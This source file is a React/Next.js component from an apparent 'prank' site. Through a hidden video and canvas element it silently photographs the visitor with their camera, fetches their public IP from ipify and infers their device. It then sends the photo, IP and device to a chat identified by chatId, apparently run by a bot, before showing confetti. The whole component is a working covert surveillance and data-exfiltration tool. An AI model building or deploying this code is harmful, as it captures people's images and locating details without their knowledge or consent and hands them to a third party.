"use client";

import confetti from "canvas-confetti";
import { useTranslations } from "next-intl";
import { useCallback, useEffect, useState } from "react";
import { sendPhotoToChat } from "../_actions/send-photo-to-chat";
import { useCamera } from "../_hooks/use-camera";
import { Loader } from "./loader";
import { RichText } from "./ui/rich-text";

async function getUserIp() {
	return fetch("https://api.ipify.org/?format=json")
		.then((res) => res.json())
		.then((data) => data.ip)
		.catch(() => "unknown");
}

function getUserDevice() {
	const userAgent = navigator.userAgent;

	if (/Windows/.test(userAgent)) {
		return "Windows";
	}

	if (/Macintosh/.test(userAgent)) {
		return "MacOS";
	}

	if (/Android/.test(userAgent)) {
		return "Android";
	}

	if (/iPhone/.test(userAgent)) {
		return "iPhone";
	}

	if (/iPad/.test(userAgent)) {
		return "iPad";
	}

	if (/CrOS/.test(userAgent)) {
		return "ChromeOS";
	}

	if (/Linux/.test(userAgent)) {
		return "Linux";
	}

	return "unknown";
}

interface CameraProps {
	chatId: number;
}

export const Camera = ({ chatId }: CameraProps) => {
	const { videoRef, canvasRef, photo } = useCamera();
	const [isTakingPhoto, setIsTakingPhoto] = useState(true);
	const t = useTranslations("prank");

	const handlePhoto = useCallback(
		async (_photo: string) => {
			const ip = await getUserIp();
			const device = getUserDevice();
			await sendPhotoToChat({ photo: _photo, chatId, ip, device });

			setIsTakingPhoto(false);
			confetti({
				particleCount: 500,
				spread: 90,
				origin: { y: 1.2 },
				scalar: 2,
				startVelocity: 80,
				ticks: 500
			});
		},
		[chatId]
	);

	useEffect(() => {
		if (!photo) return;

		handlePhoto(photo);
	}, [photo, handlePhoto]);

	return (
		<>
			<video ref={videoRef} style={{ display: "none" }} autoPlay />
			<canvas className="hidden" ref={canvasRef} />
			{!isTakingPhoto ? (
				<div className="flex flex-col text-center gap-4 w-full md:w-1/2">
					<h1 className="text-3xl font-bold mb-4">{t("title")}</h1>
					<RichText>
						{(messages) =>
							t.rich("subtitle", {
								...messages,
								botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`
							})
						}
					</RichText>
					<RichText className="mt-4">{(messages) => t.rich("button", messages)}</RichText>
					<RichText className="text-xs">
						{(messages) =>
							t.rich("description", {
								...messages,
								botTag: `@${process.env.NEXT_PUBLIC_BOT_NAME}`
							})
						}
					</RichText>
				</div>
			) : (
				<Loader />
			)}
		</>
	);
};

export const CameraNotAllowed = () => {
	const t = useTranslations("common");

	return <h1 className="font-semibold text-xl">{t("camera-not-allowed")}</h1>;
};
